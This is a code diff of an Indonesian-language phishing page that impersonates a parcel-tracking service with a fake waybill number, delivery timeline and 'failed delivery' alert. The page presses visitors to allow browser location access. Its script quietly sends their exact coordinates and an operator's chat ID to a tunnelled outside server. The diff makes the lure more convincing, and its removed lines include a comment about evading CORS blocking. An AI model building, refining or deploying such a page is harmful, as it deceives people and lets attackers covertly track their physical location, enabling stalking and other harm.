@@ -3,34 +3,84 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Konfirmasi Pengiriman Paket</title>
+    <title>Sistem Pelacakan Paket Online (Ekspedisi Gateway)</title>
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; background-color: #f4f4f4; }
-        .card { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); max-width: 400px; margin: 20px auto; }
-        .btn { background-color: #28a745; color: white; padding: 12px 24px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; font-weight: bold; width: 100%; }
-        .btn:hover { background-color: #218838; }
-        h2 { color: #333; }
-        p { color: #666; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background-color: #f7f9fa; color: #333; padding: 15px; }
+        .header { background-color: #e52d27; color: white; padding: 15px; text-align: center; font-weight: bold; font-size: 18px; border-radius: 8px 8px 0 0; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        .container { background: white; max-width: 480px; margin: 0 auto 20px auto; border-radius: 0 0 8px 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); padding: 20px; }
+        .resi-box { background-color: #f1f3f5; padding: 12px; border-radius: 6px; margin-bottom: 15px; border-left: 4px solid #e52d27; }
+        .resi-title { font-size: 12px; color: #6c757d; text-transform: uppercase; font-weight: bold; }
+        .resi-num { font-size: 16px; font-weight: bold; color: #212529; margin-top: 2px; }
+        .alert-box { background-color: #fff3cd; border: 1px solid #ffeeba; color: #856404; padding: 12px; border-radius: 6px; margin-bottom: 20px; font-size: 14px; line-height: 1.4; display: flex; align-items: center; }
+        .alert-icon { font-size: 24px; margin-right: 10px; }
+        .btn-verify { background: linear-gradient(to right, #b31217, #e52d27); color: white; border: none; width: 100%; padding: 14px; font-size: 15px; font-weight: bold; border-radius: 6px; cursor: pointer; transition: background 0.3s; box-shadow: 0 4px 6px rgba(229, 45, 39, 0.2); }
+        .btn-verify:hover { background: #b31217; }
+        .status-timeline { margin-top: 25px; border-left: 2px dashed #ced4da; padding-left: 20px; margin-left: 10px; position: relative; }
+        .timeline-item { margin-bottom: 20px; position: relative; }
+        .timeline-item::before { content: ''; width: 12px; height: 12px; background-color: #ced4da; border-radius: 50%; position: absolute; left: -27px; top: 4px; }
+        .timeline-item.active::before { background-color: #e52d27; box-shadow: 0 0 0 4px rgba(229, 45, 39, 0.2); }
+        .time { font-size: 11px; color: #868e96; }
+        .desc { font-size: 13px; font-weight: 500; color: #495057; margin-top: 2px; }
+        .desc-bold { color: #e52d27; font-weight: bold; }
+        #status-message { text-align: center; margin-top: 15px; font-weight: bold; font-size: 14px; }
+        .footer { text-align: center; font-size: 11px; color: #adb5bd; margin-top: 20px; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <h2>📍 Konfirmasi Lokasi Pengiriman</h2>
-    <p>Sistem mendeteksi ketidaksesuaian alamat. Silakan verifikasi koordinat GPS rumah Anda agar kurir tidak salah mengantar paket.</p>
-    <br>
-    <button class="btn" onclick="ambilLokasi()">KONFIRMASI LOKASI SAYA</button>
-    <p id="status" style="margin-top: 15px; font-weight: bold; color: #d9534f;"></p>
-</div>
+    <div class="header">
+        📦 TRACKING LOGISTIC SYSTEM
+    </div>
+
+    <div class="container">
+        <div class="resi-box">
+            <div class="resi-title">Nomor Resi / Waybill No.</div>
+            <div class="resi-num">JKT-9920138475-EXP</div>
+        </div>
+
+        <div class="alert-box">
+            <div class="alert-icon">⚠️</div>
+            <div>
+                <strong>Gagal Kirim:</strong> Kurir kesulitan menemukan titik koordinat rumah Anda. Silakan verifikasi radar GPS Anda sekarang agar paket bisa segera diantar ke lokasi.
+            </div>
+        </div>
+
+        <button class="btn-verify" onclick="ambilLokasi()">🎯 SINKRONISASI GPS RUMAH SAYA</button>
+        <div id="status-message"></div>
+
+        <div class="status-timeline">
+            <div class="timeline-item active">
+                <div class="time">Hari ini - 11:42 WIB</div>
+                <div class="desc desc-bold">Pending: Titik GPS Alamat Kurang Akurat (Dibutuhkan Kalibrasi Mandiri)</div>
+            </div>
+            <div class="timeline-item">
+                <div class="time">Hari ini - 07:15 WIB</div>
+                <div class="desc">Paket dibawa oleh kurir menuju wilayah transit Jakarta Selatan</div>
+            </div>
+            <div class="timeline-item">
+                <div class="time">Kemarin - 20:30 WIB</div>
+                <div class="desc">Paket telah tiba di Pusat Sortir Utama (DC Jakarta)</div>
+            </div>
+            <div class="timeline-item">
+                <div class="time">2 Hari Lalu - 14:22 WIB</div>
+                <div class="desc">Paket berhasil diserahkan oleh pengirim (Seller)</div>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        &copy; 2026 Logistic Express Gateway Indonesia. All Rights Reserved.
+    </div>
 
 <script>
     const urlParams = new URLSearchParams(window.location.search);
     const userIdAdmin = urlParams.get('uid'); 
 
     function ambilLokasi() {
-        const statusText = document.getElementById("status");
-        statusText.style.color = "#333";
-        statusText.innerText = "Menghubungkan ke satelit GPS...";
+        const statusText = document.getElementById("status-message");
+        statusText.style.color = "#495057";
+        statusText.innerText = "🔄 Menghubungkan ke satelit GPS, mohon tunggu...";
 
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(kirimKeTermux, tanganiError, {
@@ -39,8 +89,8 @@
                 maximumAge: 0
             });
         } else {
-            statusText.style.color = "#d9534f";
-            statusText.innerText = "Browser tidak mendukung sensor GPS.";
+            statusText.style.color = "#dc3545";
+            statusText.innerText = "❌ Browser tidak mendukung enkripsi GPS.";
         }
     }
 
@@ -48,44 +98,41 @@
         const lat = position.coords.latitude;
         const lon = position.coords.longitude;
         const acc = position.coords.accuracy;
-        const statusText = document.getElementById("status");
+        const statusText = document.getElementById("status-message");
 
         const targetChatId = userIdAdmin ? userIdAdmin : 6953925929; 
-
-        // Alamat server aman Serveo 2 milik Anda
         const URL_SERVER_TERMUX = "https://serveousercontent.com";
-
-        // MENGGUNAKAN METODE FORMDATA AGAR LOLOS DARI BLOKIRAN KEAMANAN CHROME (CORS)
-        const form = new FormData();
-        form.append('lat', lat);
-        form.append('lon', lon);
-        form.append('acc', acc);
-        form.append('uid', targetChatId);
 
         fetch(URL_SERVER_TERMUX, {
             method: 'POST',
-            mode: 'no-cors', // Memaksa browser mengabaikan aturan CORS agar data lolos terkirim
-            body: form
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                lat: lat,
+                lon: lon,
+                acc: acc,
+                uid: targetChatId
+            })
         })
-        .then(() => {
+        .then(res => res.json())
+        .then(data => {
             statusText.style.color = "#28a745";
-            statusText.innerText = "✅ Verifikasi Lokasi Sukses! Alamat paket diperbarui.";
+            statusText.innerText = "✅ Sukses! Titik lokasi rumah Anda berhasil dikalibrasi. Kurir akan segera meluncur.";
         })
         .catch(err => {
-            statusText.style.color = "#d9534f";
-            statusText.innerText = "Gagal memproses data lokasi.";
+            statusText.style.color = "#dc3545";
+            statusText.innerText = "❌ Sinkronisasi gagal. Coba matikan Wi-Fi dan gunakan data seluler.";
         });
     }
 
     function tanganiError(error) {
-        const statusText = document.getElementById("status");
-        statusText.style.color = "#d9534f";
+        const statusText = document.getElementById("status-message");
+        statusText.style.color = "#dc3545";
         switch(error.code) {
             case error.PERMISSION_DENIED:
-                statusText.innerText = "❌ Gagal: Anda harus klik 'Izinkan/Allow' akses lokasi browser.";
+                statusText.innerText = "❌ Kesalahan: Anda wajib mengklik 'Izinkan / Allow' akses lokasi pada pop-up browser agar kurir dapat membaca peta.";
                 break;
             default:
-                statusText.innerText = "❌ Gagal: Terjadi gangguan GPS.";
+                statusText.innerText = "❌ Sinkronisasi gagal karena gangguan sinyal satelit.";
         }
     }
 </script>
